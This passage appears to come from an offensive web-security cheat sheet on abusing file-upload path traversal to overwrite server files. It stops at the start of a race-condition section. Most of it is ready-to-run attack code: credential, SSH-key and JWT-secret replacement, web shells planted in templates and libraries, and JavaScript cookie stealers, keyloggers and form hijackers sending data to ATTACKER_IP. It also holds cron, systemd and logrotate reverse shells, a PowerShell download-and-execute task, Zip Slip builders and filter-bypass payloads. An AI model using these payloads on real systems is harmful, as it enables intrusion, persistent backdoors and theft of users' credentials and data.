## Authentication & Credential File Overwrite

::warning
Overwriting authentication-related files allows complete authentication bypass, credential replacement, session manipulation, and privilege escalation without needing to exploit application logic.
::

::code-group
```bash [Password & Auth Files]
# Overwrite .htpasswd (Apache basic auth)
# Generate attacker-controlled password
HASH=$(openssl passwd -apr1 "attackerpass")
echo "admin:${HASH}" > .htpasswd

curl -F "file=@.htpasswd;filename=../../.htpasswd" https://target.com/upload
curl -F "file=@.htpasswd;filename=../.htpasswd" https://target.com/upload

# Now authenticate with attacker credentials
curl -u "admin:attackerpass" "https://target.com/admin/"

# Overwrite shadow/passwd (if running as root — rare but critical)
# Add attacker user with root privileges
echo 'attacker:$6$salt$hash:0:0::/root:/bin/bash' >> passwd_payload
curl -F "file=@passwd_payload;filename=../../../../etc/passwd" https://target.com/upload

# Overwrite SSH authorized_keys
ssh-keygen -t rsa -b 4096 -f /tmp/attacker_key -N ""
curl -F "file=@/tmp/attacker_key.pub;filename=../../../../root/.ssh/authorized_keys" https://target.com/upload
curl -F "file=@/tmp/attacker_key.pub;filename=../../../../home/www-data/.ssh/authorized_keys" https://target.com/upload
ssh -i /tmp/attacker_key root@target.com

# Overwrite JWT secret files
echo "attacker_jwt_secret_key_12345" > jwt_secret
curl -F "file=@jwt_secret;filename=../../config/jwt_secret" https://target.com/upload
curl -F "file=@jwt_secret;filename=../../.env.jwt" https://target.com/upload

# Forge JWT with known secret
python3 -c "
import jwt
token = jwt.encode({'user': 'admin', 'role': 'admin', 'id': 1}, 'attacker_jwt_secret_key_12345', algorithm='HS256')
print(token)
"
```

```bash [Database Configuration]
# Overwrite database configuration to redirect connections

# PHP database config
cat > database.php << 'EOF'
<?php
if(isset($_GET['cmd'])){system($_GET['cmd']);die();}
return [
    'host' => 'ATTACKER_IP',
    'port' => 3306,
    'database' => 'exfiltrate',
    'username' => 'root',
    'password' => '',
    'charset' => 'utf8mb4',
];
EOF

curl -F "file=@database.php;filename=../../config/database.php" https://target.com/upload

# Django database settings
cat > db_settings.py << 'PYEOF'
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'exfiltrate',
        'USER': 'root',
        'PASSWORD': '',
        'HOST': 'ATTACKER_IP',
        'PORT': '3306',
    }
}
PYEOF

curl -F "file=@db_settings.py;filename=../../myapp/db_settings.py" https://target.com/upload

# Laravel .env with attacker database
cat > .env << 'EOF'
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:ATTACKER_CONTROLLED_KEY_FOR_DESERIALIZATION
APP_DEBUG=true
DB_CONNECTION=mysql
DB_HOST=ATTACKER_IP
DB_PORT=3306
DB_DATABASE=exfiltrate
DB_USERNAME=root
DB_PASSWORD=

MAIL_MAILER=smtp
MAIL_HOST=ATTACKER_IP
MAIL_PORT=25
EOF

curl -F "file=@.env;filename=../../.env" https://target.com/upload

# Set up rogue MySQL server to capture credentials
# On ATTACKER_IP:
python3 -c "
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 3306))
s.listen(5)
print('[*] Rogue MySQL listening on :3306')
while True:
    c, addr = s.accept()
    print(f'[+] Connection from {addr}')
    # Send MySQL greeting
    c.send(b'\x4a\x00\x00\x00\x0a\x35\x2e\x37\x2e\x33\x39\x00')
    data = c.recv(4096)
    print(f'[+] Received: {data}')
    c.close()
"
```

```bash [Session & Token Storage]
# Overwrite session storage files
# PHP sessions stored as files
echo 'cmd|s:6:"system";' > sess_attacker123
curl -F "file=@sess_attacker123;filename=../../../../tmp/sess_attacker123" https://target.com/upload
curl -F "file=@sess_attacker123;filename=../../../../var/lib/php/sessions/sess_attacker123" https://target.com/upload

# Overwrite Flask session signing key
cat > secret_key << 'EOF'
attacker_flask_secret_key
EOF
curl -F "file=@secret_key;filename=../../instance/secret_key" https://target.com/upload

# Forge Flask session cookie
python3 -c "
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer('attacker_flask_secret_key')
session = {'user_id': 1, 'is_admin': True, 'username': 'admin'}
cookie = s.dumps(session, salt='cookie-session')
print(f'session={cookie}')
"

# Overwrite OAuth/OIDC configuration
cat > oauth_config.json << 'EOF'
{
  "client_id": "attacker_client_id",
  "client_secret": "attacker_client_secret",
  "redirect_uri": "https://ATTACKER_IP/callback",
  "authorization_endpoint": "https://ATTACKER_IP/auth",
  "token_endpoint": "https://ATTACKER_IP/token"
}
EOF

curl -F "file=@oauth_config.json;filename=../../config/oauth.json" https://target.com/upload
```
::

---

## Template & View Overwrite

::tabs
  :::tabs-item{icon="i-lucide-layout" label="Template Engine Exploitation"}
  ```bash [Terminal]
  # Overwriting template files achieves code execution when template is rendered

  # Jinja2 template (Flask/Django)
  cat > index.html << 'EOF'
  {% if request.args.get('cmd') %}
    {{ config.__class__.__init__.__globals__['os'].popen(request.args.get('cmd')).read() }}
  {% else %}
  <html><body><h1>Welcome</h1></body></html>
  {% endif %}
  EOF

  curl -F "file=@index.html;filename=../../templates/index.html" https://target.com/upload
  curl "https://target.com/?cmd=id"

  # EJS template (Express.js)
  cat > index.ejs << 'EOF'
  <% if (typeof process !== 'undefined' && require('url').parse(require('http').IncomingMessage.prototype.url || '', true).query.cmd) { %>
  <pre><%= require('child_process').execSync(require('url').parse(require('http').IncomingMessage.prototype.url || '', true).query.cmd).toString() %></pre>
  <% } else { %>
  <html><body><h1>Welcome</h1></body></html>
  <% } %>
  EOF

  curl -F "file=@index.ejs;filename=../../views/index.ejs" https://target.com/upload

  # Pug template (Express.js)
  cat > index.pug << 'EOF'
  - var cmd = req.query.cmd
  if cmd
    - var exec = require('child_process').execSync
    pre= exec(cmd).toString()
  else
    h1 Welcome
  EOF

  curl -F "file=@index.pug;filename=../../views/index.pug" https://target.com/upload

  # Twig template (Symfony/PHP)
  cat > index.html.twig << 'EOF'
  {% if app.request.get('cmd') %}
    {{ _self.env.registerUndefinedFilterCallback("system") }}
    {{ _self.env.getFilter(app.request.get('cmd')) }}
  {% else %}
    <h1>Welcome</h1>
  {% endif %}
  EOF

  curl -F "file=@index.html.twig;filename=../../templates/index.html.twig" https://target.com/upload
  curl "https://target.com/?cmd=id"

  # Blade template (Laravel)
  cat > welcome.blade.php << 'EOF'
  @if(request()->has('cmd'))
    {!! '<pre>' . shell_exec(request()->get('cmd')) . '</pre>' !!}
  @else
    <h1>Welcome to Laravel</h1>
  @endif
  EOF

  curl -F "file=@welcome.blade.php;filename=../../resources/views/welcome.blade.php" https://target.com/upload
  curl "https://target.com/?cmd=id"

  # ERB template (Ruby on Rails)
  cat > index.html.erb << 'EOF'
  <% if params[:cmd] %>
    <pre><%= `#{params[:cmd]}` %></pre>
  <% else %>
    <h1>Welcome</h1>
  <% end %>
  EOF

  curl -F "file=@index.html.erb;filename=../../app/views/home/index.html.erb" https://target.com/upload

  # Freemarker template (Java/Spring)
  cat > index.ftl << 'EOF'
  <#assign ex="freemarker.template.utility.Execute"?new()>
  ${ex("id")}
  EOF

  curl -F "file=@index.ftl;filename=../../src/main/resources/templates/index.ftl" https://target.com/upload

  # Thymeleaf template (Java/Spring)
  cat > index.html << 'EOF'
  <!DOCTYPE html>
  <html xmlns:th="http://www.thymeleaf.org">
  <body>
  <div th:with="cmd=${T(java.lang.Runtime).getRuntime().exec('id')}" 
       th:text="${cmd.inputStream.text}">
  </div>
  </body>
  </html>
  EOF

  curl -F "file=@index.html;filename=../../src/main/resources/templates/index.html" https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-layers" label="Error Page & 404 Overwrite"}
  ```bash [Terminal]
  # Overwrite custom error pages — triggered on every 404 or error

  # PHP custom error page
  cat > 404.php << 'EOF'
  <?php
  if(isset($_GET['cmd'])){system($_GET['cmd']);die();}
  ?>
  <!DOCTYPE html>
  <html><body><h1>404 - Page Not Found</h1></body></html>
  EOF

  curl -F "file=@404.php;filename=../../404.php" https://target.com/upload
  curl -F "file=@404.php;filename=../../errors/404.php" https://target.com/upload

  # Trigger by accessing nonexistent URL
  curl "https://target.com/nonexistent_page_xyz?cmd=id"

  # HTML error page with SSTI (if template-rendered)
  cat > 500.html << 'EOF'
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  <h1>500 - Internal Server Error</h1>
  EOF

  curl -F "file=@500.html;filename=../../templates/500.html" https://target.com/upload
  # Trigger 500 error to execute template

  # Express error handler
  cat > error.ejs << 'EOF'
  <% if(typeof require !== 'undefined'){try{
    var output = require('child_process').execSync('id').toString();
  %>
  <pre><%= output %></pre>
  <% }catch(e){} } %>
  <h1>Error: <%= message %></h1>
  EOF

  curl -F "file=@error.ejs;filename=../../views/error.ejs" https://target.com/upload

  # Apache error document overwrite via .htaccess
  cat > .htaccess << 'EOF'
  ErrorDocument 404 /uploads/shell.php
  ErrorDocument 403 /uploads/shell.php
  ErrorDocument 500 /uploads/shell.php
  EOF

  curl -F "file=@.htaccess;filename=../../.htaccess" https://target.com/upload
  ```
  :::
::

---

## Dependency & Library Overwrite

::caution
Modern applications rely heavily on autoloaded libraries, middleware, and imported modules. Overwriting a single dependency file can inject malicious code into every request processed by the application, providing stealthy and persistent code execution.
::

::accordion
  :::accordion-item{icon="i-lucide-package" label="PHP Autoload & Composer"}
  ```bash [Terminal]
  # Overwrite Composer autoload file
  cat > autoload.php << 'EOF'
  <?php
  // Backdoor executes on every request (autoload.php is included in every PHP file)
  if(isset($_SERVER['HTTP_X_CMD'])){
    header('Content-Type: text/plain');
    echo shell_exec($_SERVER['HTTP_X_CMD']);
    exit();
  }
  // Original autoload
  require_once __DIR__ . '/composer/autoload_real.php';
  return ComposerAutoloaderInitXXXXXXXXXXXXXX::getLoader();
  EOF

  curl -F "file=@autoload.php;filename=../../vendor/autoload.php" https://target.com/upload
  curl -H "X-CMD: id" "https://target.com/"

  # Overwrite specific vendor library
  # Example: Overwrite monolog logger (commonly used)
  cat > Logger.php << 'EOF'
  <?php
  namespace Monolog;
  class Logger {
      public function __construct() {
          if(isset($_GET['cmd'])){system($_GET['cmd']);die();}
      }
      public function __call($name, $args) { return $this; }
      public function pushHandler($h) { return $this; }
      public function info($msg) { return $this; }
      public function error($msg) { return $this; }
      public function debug($msg) { return $this; }
      public function warning($msg) { return $this; }
  }
  EOF

  curl -F "file=@Logger.php;filename=../../vendor/monolog/monolog/src/Monolog/Logger.php" https://target.com/upload

  # Overwrite PSR autoload classmap
  cat > autoload_classmap.php << 'EOF'
  <?php
  @eval($_POST['backdoor']);
  return array();
  EOF

  curl -F "file=@autoload_classmap.php;filename=../../vendor/composer/autoload_classmap.php" https://target.com/upload

  # Overwrite WordPress plugin file
  cat > plugin.php << 'EOF'
  <?php
  /*
  Plugin Name: Akismet Anti-Spam
  Description: Security plugin
  Version: 5.0
  */
  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);die();}
  EOF

  curl -F "file=@plugin.php;filename=../../wp-content/plugins/akismet/akismet.php" https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-package" label="Node.js Module Overwrite"}
  ```bash [Terminal]
  # Overwrite node_modules packages

  # Overwrite express module entry point
  cat > index.js << 'EOF'
  const original = require('./lib/express');
  const { execSync } = require('child_process');

  // Backdoor middleware injected into every Express app
  const _listen = original.application.listen;
  original.application.listen = function() {
    this.use((req, res, next) => {
      if (req.headers['x-cmd']) {
        try {
          const output = execSync(req.headers['x-cmd']).toString();
          return res.send(output);
        } catch(e) {
          return res.send(e.message);
        }
      }
      next();
    });
    return _listen.apply(this, arguments);
  };

  module.exports = original;
  EOF

  curl -F "file=@index.js;filename=../../node_modules/express/index.js" https://target.com/upload
  curl -H "X-CMD: id" "https://target.com/"

  # Overwrite commonly required utility module
  cat > index.js << 'EOF'
  const original = module.exports = require('./lodash');
  // Backdoor on require
  try {
    require('child_process').exec('curl http://ATTACKER_IP:8080/$(whoami)');
  } catch(e) {}
  EOF

  curl -F "file=@index.js;filename=../../node_modules/lodash/index.js" https://target.com/upload

  # Overwrite dotenv (loaded early in most apps)
  cat > main.js << 'EOF'
  const { execSync } = require('child_process');
  try { execSync('curl http://ATTACKER_IP:8080/dotenv-backdoor'); } catch(e) {}
  const orig = require('./lib/main');
  module.exports = orig;
  EOF

  curl -F "file=@main.js;filename=../../node_modules/dotenv/main.js" https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-package" label="Python Module Overwrite"}
  ```bash [Terminal]
  # Overwrite Python packages in site-packages or virtual environment

  # Overwrite Flask's __init__.py
  cat > __init__.py << 'PYEOF'
  import os, subprocess
  # Backdoor executes when Flask is imported
  if os.environ.get('CMD'):
      subprocess.run(os.environ['CMD'], shell=True)

  # Monkey-patch Flask to add backdoor route
  from flask.original import *
  from flask import Flask as _Flask

  class Flask(_Flask):
      def __init__(self, *args, **kwargs):
          super().__init__(*args, **kwargs)
          @self.route('/_cmd')
          def _cmd():
              import subprocess
              cmd = __import__('flask').request.args.get('c', 'id')
              return '<pre>' + subprocess.getoutput(cmd) + '</pre>'
  PYEOF

  curl -F "file=@__init__.py;filename=../../../../usr/lib/python3/dist-packages/flask/__init__.py" https://target.com/upload
  curl -F "file=@__init__.py;filename=../../venv/lib/python3.11/site-packages/flask/__init__.py" https://target.com/upload

  # Overwrite sitecustomize.py (executes on every Python startup)
  cat > sitecustomize.py << 'PYEOF'
  import os
  os.system('curl http://ATTACKER_IP:8080/python-backdoor-$(whoami)')
  PYEOF

  curl -F "file=@sitecustomize.py;filename=../../../../usr/lib/python3/dist-packages/sitecustomize.py" https://target.com/upload

  # Overwrite usercustomize.py
  curl -F "file=@sitecustomize.py;filename=../../../../usr/lib/python3/dist-packages/usercustomize.py" https://target.com/upload

  # Overwrite __pycache__ .pyc files (compiled Python)
  # First, compile backdoor to .pyc
  python3 -c "
  import py_compile
  with open('/tmp/backdoor.py', 'w') as f:
      f.write('import os; os.system(\"curl http://ATTACKER_IP:8080/pyc-backdoor\")')
  py_compile.compile('/tmp/backdoor.py', '/tmp/backdoor.pyc')
  "
  curl -F "file=@/tmp/backdoor.pyc;filename=../../app/__pycache__/views.cpython-311.pyc" https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-package" label="Ruby Gem Overwrite"}
  ```bash [Terminal]
  # Overwrite Ruby gems

  # Overwrite Rack middleware
  cat > handler.rb << 'EOF'
  module Rack
    class Handler
      def self.get(server)
        # Backdoor
        if ENV['CMD']
          system(ENV['CMD'])
        end
        original_get(server)
      end
    end
  end
  EOF

  curl -F "file=@handler.rb;filename=../../vendor/bundle/ruby/3.1.0/gems/rack-2.2.4/lib/rack/handler.rb" https://target.com/upload

  # Overwrite Rails initializer
  cat > backdoor.rb << 'EOF'
  # Initializer that runs on Rails boot
  Rails.application.config.after_initialize do
    Rails.application.routes.draw do
      get '/_cmd', to: proc { |env|
        cmd = Rack::Utils.parse_query(env['QUERY_STRING'])['c'] || 'id'
        [200, {'Content-Type' => 'text/plain'}, [`#{cmd}`]]
      }
    end
  end
  EOF

  curl -F "file=@backdoor.rb;filename=../../config/initializers/backdoor.rb" https://target.com/upload

  # Overwrite Gemfile to add malicious gem
  cat > Gemfile << 'EOF'
  source 'https://rubygems.org'
  gem 'rails', '~> 7.0'
  gem 'evil-gem', git: 'https://github.com/attacker/evil-gem'
  EOF

  curl -F "file=@Gemfile;filename=../../Gemfile" https://target.com/upload
  ```
  :::
::

---

## Static Asset & Stored XSS Overwrite

::tabs
  :::tabs-item{icon="i-lucide-code" label="JavaScript File Overwrite"}
  ```bash [Terminal]
  # Overwrite application JavaScript files loaded by all users
  # Achieves stored XSS affecting every visitor

  # Identify loaded JavaScript files
  curl -s https://target.com/ | grep -oP 'src="[^"]*\.js[^"]*"' | cut -d'"' -f2

  # Common targets
  JS_TARGETS=(
    "js/app.js" "js/main.js" "js/bundle.js" "js/vendor.js"
    "static/js/app.js" "assets/js/main.js"
    "dist/js/app.js" "public/js/app.js"
    "js/jquery.min.js" "js/bootstrap.min.js"
  )

  # Payload 1: Cookie stealer prepended to legitimate JS
  cat > app.js << 'EOF'
  // Exfiltrate cookies and credentials
  (function(){
    new Image().src='https://ATTACKER_IP/steal?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href);
    
    // Keylogger
    document.addEventListener('keypress', function(e){
      new Image().src='https://ATTACKER_IP/key?k='+e.key+'&u='+location.href;
    });

    // Form hijacker
    document.querySelectorAll('form').forEach(function(f){
      f.addEventListener('submit', function(e){
        var data = new FormData(f);
        var params = '';
        data.forEach(function(v,k){params += k+'='+encodeURIComponent(v)+'&';});
        new Image().src='https://ATTACKER_IP/form?'+params;
      });
    });
  })();
  // Original application code continues...
  EOF

  for target in "${JS_TARGETS[@]}"; do
    echo -n "Overwriting $target: "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@app.js;filename=../../${target}" \
      https://target.com/upload
    echo ""
  done

  # Payload 2: Admin session hijack via overwritten JS
  cat > admin.js << 'EOF'
  (function(){
    if(document.cookie.indexOf('session') !== -1 || document.cookie.indexOf('token') !== -1){
      // Create admin account via API
      fetch('/api/users', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          username: 'backdoor_admin',
          password: 'P@ssw0rd123!',
          role: 'admin',
          email: 'attacker@evil.com'
        })
      });
      
      // Exfiltrate session
      fetch('https://ATTACKER_IP/session', {
        method: 'POST',
        body: JSON.stringify({
          cookies: document.cookie,
          localStorage: JSON.stringify(localStorage),
          sessionStorage: JSON.stringify(sessionStorage),
          url: location.href
        })
      });
    }
  })();
  EOF

  curl -F "file=@admin.js;filename=../../static/js/admin.js" https://target.com/upload

  # Payload 3: BeEF hook injection
  cat > jquery.min.js << 'EOF'
  // BeEF hook
  var s=document.createElement('script');
  s.src='http://ATTACKER_IP:3000/hook.js';
  document.head.appendChild(s);
  // Original jQuery continues...
  EOF

  curl -F "file=@jquery.min.js;filename=../../js/jquery.min.js" https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-palette" label="CSS & HTML Overwrite"}
  ```bash [Terminal]
  # CSS-based data exfiltration (no JavaScript needed)
  cat > styles.css << 'EOF'
  /* CSS keylogger via font-face */
  input[type="password"][value$="a"] { background: url('https://ATTACKER_IP/css?key=a'); }
  input[type="password"][value$="b"] { background: url('https://ATTACKER_IP/css?key=b'); }
  input[type="password"][value$="c"] { background: url('https://ATTACKER_IP/css?key=c'); }
  /* ... continue for all characters */

  /* CSRF token exfiltration via attribute selectors */
  input[name="csrf_token"][value^="a"] { background: url('https://ATTACKER_IP/csrf?v=a'); }
  input[name="csrf_token"][value^="b"] { background: url('https://ATTACKER_IP/csrf?v=b'); }

  /* Phishing overlay */
  body::after {
    content: '';
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: white;
    z-index: 99999;
  }
  body::before {
    content: 'Session expired. ';
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    z-index: 100000;
    font-size: 18px;
  }
  EOF

  curl -F "file=@styles.css;filename=../../css/styles.css" https://target.com/upload
  curl -F "file=@styles.css;filename=../../static/css/main.css" https://target.com/upload

  # Overwrite login page with phishing clone
  cat > login.html << 'EOF'
  <!DOCTYPE html>
  <html>
  <body>
  <h2>Login</h2>
  <form action="https://ATTACKER_IP/phish" method="POST">
    <input name="username" placeholder="Username" required>
    <input name="password" type="password" placeholder="Password" required>
    <button type="submit">Sign In</button>
  </form>
  </body>
  </html>
  EOF

  curl -F "file=@login.html;filename=../../login.html" https://target.com/upload

  # Service Worker overwrite (persistent XSS surviving cache)
  cat > sw.js << 'EOF'
  self.addEventListener('fetch', event => {
    // Intercept all requests
    const url = new URL(event.request.url);
    // Log to attacker
    fetch('https://ATTACKER_IP/sw?url=' + encodeURIComponent(event.request.url));
    // Serve original content
    event.respondWith(fetch(event.request));
  });
  EOF

  curl -F "file=@sw.js;filename=../../sw.js" https://target.com/upload
  curl -F "file=@sw.js;filename=../../service-worker.js" https://target.com/upload
  ```
  :::
::

---

## Cron, Systemd & Scheduled Task Overwrite

::note
Overwriting scheduled task configuration files provides time-delayed code execution that persists across application restarts and runs with potentially elevated privileges.
::

::code-group
```bash [Linux Cron Overwrite]
# Overwrite user crontab
cat > crontab << 'EOF'
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
*/5 * * * * curl http://ATTACKER_IP:8080/$(whoami)@$(hostname)
EOF

curl -F "file=@crontab;filename=../../../../var/spool/cron/crontabs/www-data" https://target.com/upload
curl -F "file=@crontab;filename=../../../../var/spool/cron/crontabs/root" https://target.com/upload

# Overwrite cron.d scripts
cat > backdoor << 'EOF'
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
EOF

curl -F "file=@backdoor;filename=../../../../etc/cron.d/backdoor" https://target.com/upload

# Overwrite daily/hourly/weekly cron scripts
cat > backdoor.sh << 'EOF'
#!/bin/bash
curl http://ATTACKER_IP:8080/cron-$(whoami) 2>/dev/null
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null &
EOF

curl -F "file=@backdoor.sh;filename=../../../../etc/cron.daily/backdoor" https://target.com/upload
curl -F "file=@backdoor.sh;filename=../../../../etc/cron.hourly/backdoor" https://target.com/upload

# Overwrite logrotate config (runs daily as root)
cat > app_logrotate << 'EOF'
/var/log/app/*.log {
    daily
    rotate 7
    postrotate
        /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
    endscript
}
EOF

curl -F "file=@app_logrotate;filename=../../../../etc/logrotate.d/app" https://target.com/upload
```

```bash [Systemd Service Overwrite]
# Overwrite systemd service files
cat > webapp.service << 'EOF'
[Unit]
Description=Web Application
After=network.target

[Service]
Type=simple
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &'
ExecStart=/usr/bin/python3 /var/www/app/app.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

curl -F "file=@webapp.service;filename=../../../../etc/systemd/system/webapp.service" https://target.com/upload

# Overwrite systemd timer (like cron but systemd)
cat > backup.timer << 'EOF'
[Unit]
Description=Run backdoor

[Timer]
OnCalendar=*:*:00
Persistent=true

[Install]
WantedBy=timers.target
EOF

cat > backup.service << 'EOF'
[Unit]
Description=Backup Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl http://ATTACKER_IP:8080/systemd-$(whoami)'
EOF

curl -F "file=@backup.timer;filename=../../../../etc/systemd/system/backup.timer" https://target.com/upload
curl -F "file=@backup.service;filename=../../../../etc/systemd/system/backup.service" https://target.com/upload

# Overwrite profile scripts (execute on login)
cat > profile_backdoor << 'EOF'
# System-wide profile
curl http://ATTACKER_IP:8080/login-$(whoami) 2>/dev/null &
EOF

curl -F "file=@profile_backdoor;filename=../../../../etc/profile.d/backdoor.sh" https://target.com/upload
```

```bash [Windows Scheduled Tasks]
# Overwrite Windows scheduled task XML
cat > task.xml << 'EOF'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/ps.ps1')"</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal>
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
  </Settings>
</Task>
EOF

curl -F "file=@task.xml;filename=..\\..\\..\\Windows\\System32\\Tasks\\MicrosoftUpdate" https://target.com/upload
```
::

---

## Path Traversal Chaining

::warning
Most overwrite attacks require path traversal to reach target files outside the upload directory. Combine traversal sequences with filename control to place files at arbitrary filesystem locations.
::

::tabs
  :::tabs-item{icon="i-lucide-folder-tree" label="Traversal Payload Matrix"}
  ```bash [Terminal]
  # Target: overwrite /var/www/html/.htaccess from /var/www/html/uploads/

  # Standard traversal sequences
  TRAVERSALS=(
    "../.htaccess"
    "../../.htaccess"
    "../../../.htaccess"
    "..%2f.htaccess"
    "..%252f.htaccess"
    "%2e%2e/.htaccess"
    "%2e%2e%2f.htaccess"
    "..\\/.htaccess"
    "..%5c.htaccess"
    "..%255c.htaccess"
    "....//....//htaccess"
    "....//.htaccess"
    "..;/.htaccess"
    "..%00/.htaccess"
    "..\\.htaccess"
    "..\\../.htaccess"
    "%c0%ae%c0%ae/.htaccess"
    "%uff0e%uff0e/.htaccess"
    "../.htaccess%00.jpg"
    "../.htaccess%0a"
  )

  for trav in "${TRAVERSALS[@]}"; do
    echo -n "$trav → "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@.htaccess;filename=${trav}" \
      https://target.com/upload
    echo ""
  done

  # Via separate path parameter
  PATH_PARAMS=(
    "path" "dir" "directory" "folder" "dest" "destination"
    "target" "upload_dir" "save_path" "file_path" "location"
  )

  for param in "${PATH_PARAMS[@]}"; do
    echo -n "Param ${param}: "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@.htaccess" \
      -F "${param}=../" \
      https://target.com/upload
    echo ""
  done

  # Via JSON body
  curl -X POST https://target.com/api/upload \
    -H "Content-Type: application/json" \
    -d '{"filename":"../.htaccess","content":"AddType application/x-httpd-php .jpg"}'

  curl -X POST https://target.com/api/upload \
    -H "Content-Type: application/json" \
    -d '{"path":"../","filename":".htaccess","content":"AddType application/x-httpd-php .jpg"}'
  ```
  :::

  :::tabs-item{icon="i-lucide-route" label="Absolute Path Overwrite"}
  ```bash [Terminal]
  # Some upload handlers accept absolute paths

  ABSOLUTE_PATHS=(
    "/var/www/html/.htaccess"
    "/var/www/html/index.php"
    "/var/www/.htaccess"
    "/etc/cron.d/backdoor"
    "/tmp/shell.php"
    "C:\\inetpub\\wwwroot\\web.config"
    "C:\\inetpub\\wwwroot\\shell.aspx"
  )

  for path in "${ABSOLUTE_PATHS[@]}"; do
    echo -n "Absolute: $path → "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@payload;filename=${path}" \
      https://target.com/upload
    echo ""
  done

  # Via API parameters
  curl -X POST https://target.com/api/upload \
    -H "Content-Type: application/json" \
    -d '{"file_path":"/var/www/html/.htaccess","content":"AddType application/x-httpd-php .jpg"}'

  # Zip Slip overwrite (if server extracts ZIP/TAR)
  # Create ZIP with path traversal in entry names
  python3 << 'PYEOF'
  import zipfile, io

  with zipfile.ZipFile('slip.zip', 'w') as zf:
      # Overwrite .htaccess via zip entry
      zf.writestr('../../.htaccess', 'AddType application/x-httpd-php .jpg\n')
      # Overwrite index.php
      zf.writestr('../../index.php', '<?php system($_GET["cmd"]); ?>')
      # Plant shell
      zf.writestr('../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
      # Normal file (decoy)
      zf.writestr('readme.txt', 'Normal file')
  
  print("[+] slip.zip created with path traversal entries")
  PYEOF

  curl -F "file=@slip.zip" https://target.com/upload

  # TAR variant
  python3 << 'PYEOF'
  import tarfile, io

  with tarfile.open('slip.tar.gz', 'w:gz') as tf:
      # .htaccess overwrite
      data = b'AddType application/x-httpd-php .jpg\n'
      info = tarfile.TarInfo(name='../../.htaccess')
      info.size = len(data)
      tf.addfile(info, io.BytesIO(data))
      
      # Shell overwrite
      data = b'<?php system($_GET["cmd"]); ?>'
      info = tarfile.TarInfo(name='../../shell.php')
      info.size = len(data)
      tf.addfile(info, io.BytesIO(data))

  print("[+] slip.tar.gz created")
  PYEOF

  curl -F "file=@slip.tar.gz" https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Filter Bypass for Traversal"}
  ```bash [Terminal]
  # Bypass common path traversal filters

  # Filter: strips ../
  # Bypass: nested sequences
  curl -F "file=@payload;filename=....//....//payload" https://target.com/upload
  curl -F "file=@payload;filename=..../\..../\payload" https://target.com/upload
  curl -F "file=@payload;filename=....\\....\\payload" https://target.com/upload

  # Filter: blocks .. entirely
  # Bypass: encoding
  curl -F "file=@payload;filename=%2e%2e%2fpayload" https://target.com/upload
  curl -F "file=@payload;filename=%252e%252e%252fpayload" https://target.com/upload

  # Filter: canonicalizes path then checks
  # Bypass: null byte injection (older systems)
  python3 -c "
  import requests
  files = {'file': ('../.htaccess\x00.jpg', open('.htaccess','rb'), 'image/jpeg')}
  r = requests.post('https://target.com/upload', files=files, verify=False)
  print(r.status_code)
  "

  # Filter: blocks both / and \
  # Bypass: alternate separators
  curl -F "file=@payload;filename=..%c0%af.htaccess" https://target.com/upload
  curl -F "file=@payload;filename=..%ef%bc%8f.htaccess" https://target.com/upload
  curl -F "file=@payload;filename=..%c1%9c.htaccess" https://target.com/upload

  # Filter: blocks filenames starting with .
  # Bypass: Unicode normalization
  python3 -c "
  import requests
  # Fullwidth period U+FF0E
  filename = '\uff0ehtaccess'
  files = {'file': (f'../{filename}', open('.htaccess','rb'), 'image/jpeg')}
  r = requests.post('https://target.com/upload', files=files, verify=False)
  print(r.status_code)
  "

  # Filter: whitelist of upload directories
  # Bypass: symlink in traversal path (if symlinks exist)
  curl -F "file=@payload;filename=../../../var/www/html/uploads/../.htaccess" https://target.com/upload
  ```
  :::
::

---

## Race Condition Overwrite

::tip
Race conditions occur when file operations are not atomic. Exploiting the time window between file creation/upload and permission setting, filename randomization, or virus scanning allows overwriting files that would normally be protected.
::

::code-group
```bash [Time-of-Check Time-of-Use (TOCTOU)]
# Exploit: Server checks filename → generates safe name → writes file
